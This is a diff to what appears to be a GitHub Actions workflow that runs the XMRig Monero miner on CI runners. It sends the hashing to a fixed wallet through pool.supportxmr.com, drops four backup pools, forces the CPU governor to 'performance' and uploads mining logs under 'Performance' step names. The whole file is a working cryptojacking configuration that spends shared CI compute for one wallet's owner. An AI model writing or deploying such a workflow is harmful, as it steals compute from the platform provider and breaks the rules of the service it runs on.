@@ -91,69 +91,21 @@ jobs:
               {
                 "algo": "rx/0",
                 "coin": "monero",
-                "url": "p2pool.io:3333",
-                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
-                "pass": "${OWNER}-r${{ matrix.runner }}",
-                "rig-id": "${OWNER}-r${{ matrix.runner }}",
-                "keepalive": true,
-                "tls": false
-              },
-              {
-                "algo": "rx/0",
-                "coin": "monero",
-                "url": "xmr.minipool.org:4444",
-                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
-                "pass": "${OWNER}-r${{ matrix.runner }}",
-                "rig-id": "${OWNER}-r${{ matrix.runner }}",
-                "keepalive": true,
-                "tls": false
-              },
-              {
-                "algo": "rx/0",
-                "coin": "monero",
-                "url": "monero.hashvault.pro:443",
+                "url": "pool.supportxmr.com:443",
                 "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
                 "pass": "${OWNER}-r${{ matrix.runner }}",
                 "rig-id": "${OWNER}-r${{ matrix.runner }}",
                 "keepalive": true,
                 "tls": true
-              },
-              {
-                "algo": "rx/0",
-                "coin": "monero",
-                "url": "xmr.crypto-pool.fr:443",
-                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
-                "pass": "${OWNER}-r${{ matrix.runner }}",
-                "rig-id": "${OWNER}-r${{ matrix.runner }}",
-                "keepalive": true,
-                "tls": true
-              },
-              {
-                "algo": "rx/0",
-                "coin": "monero",
-                "url": "gulf.moneroocean.stream:10128",
-                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
-                "pass": "${OWNER}-r${{ matrix.runner }}",
-                "rig-id": "${OWNER}-r${{ matrix.runner }}",
-                "keepalive": true,
-                "tls": false
               }
             ],
-            "retries": 5,
-            "retry-pause": 3,
+            "retries": 10,
+            "retry-pause": 5,
             "donate-level": 1,
-            "print-time": 60,
-            "log-file": "xmrig.log"
+            "print-time": 60
           }
           EOF
-
-          echo "=== Pool Configuration ==="
-          echo "Primary: P2Pool (p2pool.io:3333) - Min: 0.00027 XMR, Fee: 0%"
-          echo "Backup 1: MiniPool (xmr.minipool.org:4444) - Min: 0.001 XMR, Fee: 1.2%"
-          echo "Backup 2: HashVault (monero.hashvault.pro:443) - Min: 0.001 XMR, Fee: 0.9%"
-          echo "Backup 3: CryptoPool (xmr.crypto-pool.fr:443) - Min: 0.003 XMR, Fee: 0.9%"
-          echo "Backup 4: MoneroOcean (gulf.moneroocean.stream:10128) - Min: 0.003 XMR, Fee: 0%"
-
+          
       - name: CPU Performance Mode
         run: |
           echo performance | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor || true
@@ -180,22 +132,16 @@ jobs:
       - name: Generate Performance Summary
         if: always()
         run: |
-          cd xmrig/build
-          echo "=== Mining Session Summary ===" > ../../summary_${{ matrix.runner }}.txt
-          echo "Runner: ${{ matrix.runner }}" >> ../../summary_${{ matrix.runner }}.txt
-          echo "End Time: $(date)" >> ../../summary_${{ matrix.runner }}.txt
+          echo "=== Mining Session Summary ===" > summary_${{ matrix.runner }}.txt
+          echo "Runner: ${{ matrix.runner }}" >> summary_${{ matrix.runner }}.txt
+          echo "End Time: $(date)" >> summary_${{ matrix.runner }}.txt
 
-          if [ -f xmrig.log ]; then
-            echo -e "\n=== Pool Connection Summary ===" >> ../../summary_${{ matrix.runner }}.txt
-            grep -i "use pool\|accepted\|rejected\|difficulty" xmrig.log | tail -50 >> ../../summary_${{ matrix.runner }}.txt || echo "No pool data found" >> ../../summary_${{ matrix.runner }}.txt
+          if [ -f mining_stats_${{ matrix.runner }}.log ]; then
+            echo -e "\n=== Resource Usage (Last 20 entries) ===" >> summary_${{ matrix.runner }}.txt
+            tail -20 mining_stats_${{ matrix.runner }}.log >> summary_${{ matrix.runner }}.txt
           fi
 
-          if [ -f ../../mining_stats_${{ matrix.runner }}.log ]; then
-            echo -e "\n=== Resource Usage (Last 20 entries) ===" >> ../../summary_${{ matrix.runner }}.txt
-            tail -20 ../../mining_stats_${{ matrix.runner }}.log >> ../../summary_${{ matrix.runner }}.txt
-          fi
-
-          cat ../../summary_${{ matrix.runner }}.txt
+          cat summary_${{ matrix.runner }}.txt
 
       - name: Upload Performance Logs
         if: always()
@@ -205,7 +151,6 @@ jobs:
           path: |
             mining_stats_${{ matrix.runner }}.log
             summary_${{ matrix.runner }}.txt
-            xmrig/build/xmrig.log
           retention-days: 7
 
       - name: Cleanup
